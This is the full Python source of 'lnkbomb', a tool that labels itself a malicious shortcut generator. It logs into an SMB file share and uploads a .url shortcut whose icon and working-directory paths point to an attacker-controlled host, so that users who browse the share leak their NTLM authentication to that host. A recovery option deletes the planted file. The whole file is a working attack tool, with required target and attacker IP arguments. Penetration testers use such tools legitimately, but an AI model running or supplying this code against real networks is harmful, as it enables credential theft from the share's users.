import os
import sys
import argparse
import textwrap
import string
import random
from smb.SMBConnection import SMBConnection
import subprocess
from colorama import Fore, Style, init


def definitions():
    global info, close, success, fail, warn
    info, fail, close, success, warn = Fore.YELLOW + Style.BRIGHT, Fore.RED + \
        Style.BRIGHT, Style.RESET_ALL, Fore.GREEN + \
        Style.BRIGHT, Fore.LIGHTMAGENTA_EX + Style.BRIGHT


def banner():
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "")
    print('\n')
    print("██╗     ███╗   ██╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗██████╗")
    print("██║     ████╗  ██║██║ ██╔╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗")
    print("██║     ██╔██╗ ██║█████╔╝ ██████╔╝██║   ██║██╔████╔██║██████╔╝")
    print("██║     ██║╚██╗██║██╔═██╗ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗")
    print("███████╗██║ ╚████║██║  ██╗██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝")
    print("╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝  v2.0\n")
    print("                 Malicious Shortcut Generator               ")
    print("                 Another project by The Mayor               ")
    print("                    https://themayor.tech                 \n" + Style.RESET_ALL)


def options():
    global args, port
    opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        '''Example: 
        See https://github.com/dievus/lnkbomb for full details on using this tool.
'''))

    operating_systems = opt_parser.add_mutually_exclusive_group()
    operating_systems.add_argument(
        '-w', '--windows', help='Select for Windows-specific target operating systems. [REQUIRED]', action='store_true')
    operating_systems.add_argument(
        '-l', '--linux', help='Select for Linux-specific target operating systems. [REQUIRED]', action='store_true')
    required = opt_parser.add_argument_group('Required Arguments')
    required.add_argument(
        '-t', '--target', help='Sets the target file share IP.', nargs='?', required=True)
    required.add_argument(
        '-a', '--attacker', help='Sets the attack machine IP.', nargs='?', required=True)
    required.add_argument(
        '-s', '--share', help='Name of the share (e.g. "Department Shares").', nargs='?', required=True)

    optional = opt_parser.add_argument_group('Optional Arguments')
    optional.add_argument('-u', '--username',
                          help='Username to log in to share with.', nargs='?')
    optional.add_argument('-p', '--password',
                          help='Password to log in to share with.', nargs='?')
    optional.add_argument(
        '-r', '--recover', help='Removes the malicious payload from the share.', nargs='?')
    optional.add_argument(
        '-n', '--netbios', help='Specifies netbios name (required for Windows).', nargs='?')
    # -d/--directory flag to support dropping into subdirectories within a share
    optional.add_argument(
        '-d', '--directory', help='Subdirectory path within the share to upload the payload (e.g. "Public\\IT").', nargs='?', default='')

    args = opt_parser.parse_args()
    if args.windows:
        port = 139
    elif args.linux:
        port = 445
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()


def main(netbios, port, file_name, directory):
    try:
        if args.target is not None and args.recover is None:
            client = ''.join(random.choice(string.ascii_lowercase)
                             for i in range(10))
            conn = SMBConnection(f'{args.username}', f'{args.password}', str(
                client), netbios, use_ntlm_v2=True)
            output = conn.connect(f'{args.target}', port)

            if not output:
                print(fail + '[error] Failed to connect to the target. Check credentials, IP, and NetBIOS name.' + close)
                return
            
            # broken path formatting
            # ow correctly produces \\ATTACKER_IP\directory
            payload_content = (
                f"[InternetShortcut]\n"
                f"URL={args.attacker}\n"
                f"WorkingDirectory=\\\\{args.attacker}\\{directory}\n"
                f"IconFile=\\\\{args.attacker}\\{directory}.icon\n"
                f"IconIndex=1"
            )

            with open(f'{file_name}.url', 'w', newline='\r\n') as payload_file:
                payload_file.write(payload_content)
            
            # edgecase -> the root share might be READONLY so you can't write to it but one of the subdirs is writable 
            # storeFile(shareName, remotePath) — remotePath must include subdir if needed
            if args.directory:
                remote_path = f'{args.directory}\\{file_name}.url'
            else:
                remote_path = f'{file_name}.url'

            with open(f'{file_name}.url', 'rb') as file_obj:
                conn.storeFile(f'{args.share}', remote_path, file_obj)
                print(success + f'[success] Malicious shortcut "{file_name}.url" uploaded to \\\\{args.target}\\{args.share}\\{remote_path}\n' + close)

            conn.close()
            os.remove(f'{file_name}.url')

    except FileNotFoundError:
        print(warn + '[warn] Recovery file not found. Try again.' + close)
        if os.path.exists(f'{file_name}.url'):
            os.remove(f'{file_name}.url')
        quit()
    except ConnectionRefusedError:
        print(warn + '[warn] The remote share is unavailable. Check the target IP and port.' + close)
        quit()
    except KeyboardInterrupt:
        print(warn + '[warn] Interrupted. Cleaning up...' + close)
        if os.path.exists(f'{file_name}.url'):
            os.remove(f'{file_name}.url')
        quit()
    # print actual exception instead of swallowing it silently (better troubleshooting ig) 
    except Exception as e:
        print(fail + f'[error] {type(e).__name__}: {e}' + close)
        if os.path.exists(f'{file_name}.url'):
            os.remove(f'{file_name}.url')


def recovery(netbios, port):
    try:
        if args.recover is not None:
            client = subprocess.Popen(
                ['hostname'], stdout=subprocess.PIPE).communicate()[0].strip()
            conn = SMBConnection(f'{args.username}', f'{args.password}', str(
                client), netbios, use_ntlm_v2=True)
            output = conn.connect(f'{args.target}', port)

            if not output:
                print(fail + '[error] Failed to connect for recovery. Check credentials.' + close)
                return

            recover_file = f'{args.recover}'
            conn.deleteFiles(f'{args.share}', recover_file)
            print(success + '[success] Malicious shortcut file removed.\n' + close)
            conn.close()

    except FileNotFoundError:
        print(warn + '[warn] Recovery file not found. Try again.' + close)
        quit()
    except ConnectionRefusedError:
        print(warn + '[warn] The remote share is unavailable.' + close)
        quit()
    except KeyboardInterrupt:
        print(warn + '[warn] Interrupted.' + close)
        quit()
    except Exception as e:
        print(fail + f'[error] Recovery failed — {type(e).__name__}: {e}' + close)


if __name__ == "__main__":
    try:
        init()
        definitions()
        banner()
        options()

        if args.netbios is None:
            netbios = ''.join(random.choice(string.ascii_lowercase)
                              for i in range(10))
        else:
            netbios = args.netbios

        file_name = ''.join(random.choice(string.ascii_lowercase)
                            for i in range(10))
        directory = ''.join(random.choice(string.ascii_lowercase)
                            for i in range(10))

        if args.username is None:
            args.username = ''
        if args.password is None:
            args.password = ''

        main(netbios, port, file_name, directory)
        recovery(netbios, port)

    except KeyboardInterrupt:
        print(warn + '[warn] Interrupted. Goodbye!' + close)
    except NameError:
        print(warn + '[warn] You must specify an operating system type (-w or -l).\n' + close)
